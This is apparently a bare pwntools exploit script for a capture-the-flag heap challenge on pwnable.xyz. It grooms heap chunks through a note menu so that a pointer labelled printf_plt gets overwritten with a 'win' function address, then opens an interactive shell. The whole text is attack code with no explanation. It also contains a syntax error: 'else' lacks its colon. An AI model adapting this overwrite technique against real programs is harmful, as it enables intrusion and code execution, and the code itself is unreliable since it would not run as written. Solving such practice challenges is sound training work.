from pwn import *

win_addr = 0x40096c
printf_plt = 0x602040
debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30030)
else
    sh = process('./challenge')



def make_note(size, title, note):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', str(size))
    sh.sendafter('title: ', title)
    sh.sendafter('note: ', note)


def edit_note(number, note):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter('Note#: ',str(number))
    sh.sendafter('note: ', note)

def delete_note(number):
    sh.sendlineafter('> ', '3')
    sh.sendafter('Note#: ', str(number))

def print_note(number):
    sh.sendlineafter('> ', '4')
    sh.sendafter('Note#: ', str(number))
    



make_note(2048, "A"*0x20, "B"*0x20 + p64(printf_plt))
make_note(32, "A"*0x20, "B"*0x1f)
delete_note(0)
make_note(2008, "A"*0x20, p64(win_addr))
sh.interactive()
